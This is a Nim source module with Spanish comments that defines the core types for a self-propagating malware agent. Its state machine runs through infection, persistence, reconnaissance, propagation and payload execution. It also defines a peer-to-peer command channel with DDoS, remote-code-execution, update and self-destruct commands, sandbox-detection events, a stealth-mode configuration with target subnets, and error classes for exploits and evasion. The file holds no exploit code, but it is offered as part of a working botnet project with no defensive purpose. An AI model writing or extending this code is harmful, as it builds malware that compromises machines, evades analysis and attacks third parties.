# types.nim - Define los tipos de datos, estados y errores comunes para el proyecto FSM
# Este módulo proporciona una estructura robusta para la máquina de estados finitos del agente

import json
import times
import hashes

type
  # Estados posibles del agente en la FSM
  EstadoAgente* = enum
    Inicial
    Persistencia
    Reconocimiento
    Propagacion
    ComunicacionP2P
    EjecucionPayload
    Error

  # Tipos de eventos que pueden ocurrir en el sistema
  EventoAgenteKind* = enum
    InfeccionInicial
    PersistenciaExitosa
    PersistenciaFallida
    ObjetivoEncontrado
    ObjetivoNoVulnerable
    InfeccionExitosa
    InfeccionFallida
    ComandoRecibido
    PayloadFinalizado
    ErrorCritico
    Timeout
    SandboxDetectado
    ConexionP2PExitosa
    ConexionP2PFallida
    PayloadVerificado
    PayloadCorrupto
    PropagacionCompleta

  # Tipos de comandos que puede ejecutar el agente
  TipoComando* = enum
    DDoS
    RCE
    Scan
    Update
    SelfDestruct
    Report
    Propagate

  # Estructura detallada para comandos con toda la información necesaria
  ComandoPayload* = object
    id*: string                 # UUID único del comando
    tipo*: TipoComando          # Tipo específico del comando
    target*: string             # Destino (IP, dominio, etc.)
    ttl*: int                   # Time-to-live (número de saltos permitidos)
    prioridad*: int             # 1-10, donde 10 es crítica
    params*: seq[string]        # Parámetros específicos del comando
    timestamp*: int64           # Timestamp de emisión
    firmado*: bool              # Si el comando está firmado
    signature*: string          # Firma criptográfica del comando

  # Evento detallado con contexto usando variant objects
  EventoAgente* = object
    case kind*: EventoAgenteKind
    of InfeccionInicial, PersistenciaExitosa, ObjetivoEncontrado,
       InfeccionExitosa, PayloadFinalizado, ConexionP2PExitosa,
       PayloadVerificado, PropagacionCompleta:
      timestamp*: int64
      contexto*: JsonNode       # Metadatos adicionales del evento
    
    of PersistenciaFallida, ObjetivoNoVulnerable, InfeccionFallida,
       ConexionP2PFallida, PayloadCorrupto:
      timestampError*: int64
      error*: string            # Descripción del error
      contextoError*: JsonNode  # Metadatos adicionales
    
    of ComandoRecibido:
      comando*: ComandoPayload
      peerSource*: string       # IP del peer que envió el comando
      timestampCmd*: int64
    
    of ErrorCritico:
      timestampCrit*: int64
      msg*: string              # Mensaje de error detallado
      codigo*: int              # Código de error específico
      contextoCrit*: JsonNode   # Información de diagnóstico
    
    of Timeout:
      timestampTimeout*: int64
      tipoTimeout*: string      # "network", "propagation", "p2p", etc.
      duracion*: float          # Duración del timeout en segundos
    
    of SandboxDetectado:
      timestampSandbox*: int64
      metodoDetectado*: string  # "vm_artifacts", "timing", "hardware", etc.
      confianza*: float         # 0.0-1.0, nivel de confianza en la detección

  # Forward declaration para P2PNode (será definido en p2p.nim)
  P2PNode* = ref object
    id*: string
    address*: string
    port*: int
    active*: bool
    lastSeen*: int64
    peers*: seq[string]

  # Configuración del agente
  Config* = object
    version*: string
    maxRetries*: int
    timeoutSeconds*: int
    propagationRate*: float
    stealthMode*: bool
    debugMode*: bool
    targetSubnets*: seq[string]
    excludeSubnets*: seq[string]
    updateServer*: string
    p2pPort*: int
    encryptionKey*: string

  # Estructura principal del agente
  Agente* = ref object
    estado*: EstadoAgente
    id*: string                     # ID único del agente (SHA-256 del fingerprint)
    p2pNode*: P2PNode               # Nodo P2P actual
    config*: Config                 # Configuración del agente
    estadoAnterior*: EstadoAgente   # Para poder retroceder si es necesario
    tiempoEntradaEstado*: int64     # Timestamp de entrada al estado actual
    eventosPendientes*: seq[EventoAgente]  # Cola de eventos pendientes
    estadisticas*: JsonNode         # Métricas de rendimiento y actividad
    contextoEjecucion*: JsonNode    # Contexto específico del estado actual

  # Jerarquía de errores personalizados
  AgenteError* = object of CatchableError
  ConfigError* = object of AgenteError
  P2PError* = object of AgenteError
  CryptoError* = object of AgenteError
  ExploitError* = object of AgenteError
  PersistenceError* = object of AgenteError
  PropagationError* = object of AgenteError
  EvasionError* = object of AgenteError

# Procedimientos auxiliares para crear eventos
proc newEventoExito*(kind: EventoAgenteKind, ctx: JsonNode = newJObject()): EventoAgente =
  ## Crea un evento de éxito con timestamp y contexto
  result = EventoAgente(kind: kind)
  result.timestamp = epochTime().int64
  result.contexto = ctx

proc newEventoError*(kind: EventoAgenteKind, errorMsg: string, ctx: JsonNode = newJObject()): EventoAgente =
  ## Crea un evento de error con mensaje y contexto
  result = EventoAgente(kind: kind)
  result.timestampError = epochTime().int64
  result.error = errorMsg
  result.contextoError = ctx

proc newEventoComando*(cmd: ComandoPayload, source: string): EventoAgente =
  ## Crea un evento de comando recibido
  result = EventoAgente(kind: ComandoRecibido)
  result.comando = cmd
  result.peerSource = source
  result.timestampCmd = epochTime().int64

proc newEventoTimeout*(tipo: string, duracion: float): EventoAgente =
  ## Crea un evento de timeout
  result = EventoAgente(kind: Timeout)
  result.timestampTimeout = epochTime().int64
  result.tipoTimeout = tipo
  result.duracion = duracion

proc newEventoSandbox*(metodo: string, confianza: float): EventoAgente =
  ## Crea un evento de detección de sandbox
  result = EventoAgente(kind: SandboxDetectado)
  result.timestampSandbox = epochTime().int64
  result.metodoDetectado = metodo
  result.confianza = confianza

proc newEventoCritico*(msg: string, codigo: int, ctx: JsonNode = newJObject()): EventoAgente =
  ## Crea un evento de error crítico
  result = EventoAgente(kind: ErrorCritico)
  result.timestampCrit = epochTime().int64
  result.msg = msg
  result.codigo = codigo
  result.contextoCrit = ctx

# Procedimientos para manejo de comandos
proc newComandoPayload*(tipo: TipoComando, target: string, prioridad: int = 5): ComandoPayload =
  ## Crea un nuevo comando payload con valores por defecto
  result = ComandoPayload(
    id: $hash(epochTime()) & $hash(target),
    tipo: tipo,
    target: target,
    ttl: 10,
    prioridad: prioridad,
    params: @[],
    timestamp: epochTime().int64,
    firmado: false,
    signature: ""
  )

proc esComandoCritico*(cmd: ComandoPayload): bool =
  ## Determina si un comando es crítico basado en su prioridad
  result = cmd.prioridad >= 8

proc esComandoExpirado*(cmd: ComandoPayload, maxAge: int64 = 3600): bool =
  ## Verifica si un comando ha expirado (default: 1 hora)
  let ahora = epochTime().int64
  result = (ahora - cmd.timestamp) > maxAge

# Procedimientos para manejo del agente
proc newAgente*(id: string, cfg: Config): Agente =
  ## Crea una nueva instancia del agente
  result = Agente(
    estado: Inicial,
    id: id,
    p2pNode: P2PNode(id: id, active: false),
    config: cfg,
    estadoAnterior: Inicial,
    tiempoEntradaEstado: epochTime().int64,
    eventosPendientes: @[],
    estadisticas: newJObject(),
    contextoEjecucion: newJObject()
  )

proc tiempoEnEstadoActual*(agente: Agente): float =
  ## Calcula el tiempo que el agente ha estado en el estado actual
  result = epochTime() - agente.tiempoEntradaEstado.float

proc agregarEventoPendiente*(agente: Agente, evento: EventoAgente) =
  ## Añade un evento a la cola de eventos pendientes
  agente.eventosPendientes.add(evento)

proc procesarProximoEvento*(agente: Agente): EventoAgente =
  ## Obtiene y elimina el próximo evento de la cola
  if agente.eventosPendientes.len > 0:
    result = agente.eventosPendientes[0]
    agente.eventosPendientes.delete(0)
  else:
    raise newException(AgenteError, "No hay eventos pendientes")

# Conversión de estados a string para logging
proc `$`*(estado: EstadoAgente): string =
  case estado
  of Inicial: "INICIAL"
  of Persistencia: "PERSISTENCIA"
  of Reconocimiento: "RECONOCIMIENTO"
  of Propagacion: "PROPAGACION"
  of ComunicacionP2P: "COMUNICACION_P2P"
  of EjecucionPayload: "EJECUCION_PAYLOAD"
  of Error: "ERROR"

# Conversión de tipos de comando a string
proc `$`*(tipo: TipoComando): string =
  case tipo
  of DDoS: "DDoS"
  of RCE: "RCE"
  of Scan: "SCAN"
  of Update: "UPDATE"
  of SelfDestruct: "SELF_DESTRUCT"
  of Report: "REPORT"
  of Propagate: "PROPAGATE"

# Verificación de transiciones válidas de estado
proc esTransicionValida*(desde, hacia: EstadoAgente): bool =
  ## Verifica si una transición de estado es válida según la FSM
  case desde
  of Inicial:
    result = hacia in [Persistencia, Error]
  of Persistencia:
    result = hacia in [Reconocimiento, Error]
  of Reconocimiento:
    result = hacia in [Propagacion, ComunicacionP2P, Error]
  of Propagacion:
    result = hacia in [ComunicacionP2P, Reconocimiento, Error]
  of ComunicacionP2P:
    result = hacia in [EjecucionPayload, Propagacion, Error]
  of EjecucionPayload:
    result = hacia in [ComunicacionP2P, Propagacion, Error]
  of Error:
    result = hacia in [Inicial]  # Solo puede reiniciarse

# Export de símbolos principales
export EstadoAgente, EventoAgenteKind, TipoComando, ComandoPayload
export EventoAgente, Agente, P2PNode, Config
export AgenteError, ConfigError, P2PError, CryptoError
export ExploitError, PersistenceError, PropagationError, EvasionError
